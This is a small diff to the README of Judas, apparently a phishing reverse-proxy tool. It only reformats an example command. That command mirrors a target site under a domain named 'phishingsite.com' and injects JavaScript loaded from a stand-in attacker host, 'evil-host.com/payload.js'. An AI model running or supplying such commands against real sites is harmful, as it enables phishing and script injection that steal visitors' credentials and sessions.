@@ -93,7 +93,10 @@ Judas can also inject custom JavaScript into requests by passing a URL to a JS f
 
 Example:
 ```
-./judas --target https://target-url.com --ssl-hostname phishingsite.com --inject-js https://evil-host.com/payload.js
+./judas \
+    --target https://target-url.com \
+    --ssl-hostname phishingsite.com \
+    --inject-js https://evil-host.com/payload.js
 ```
 
 Plugins
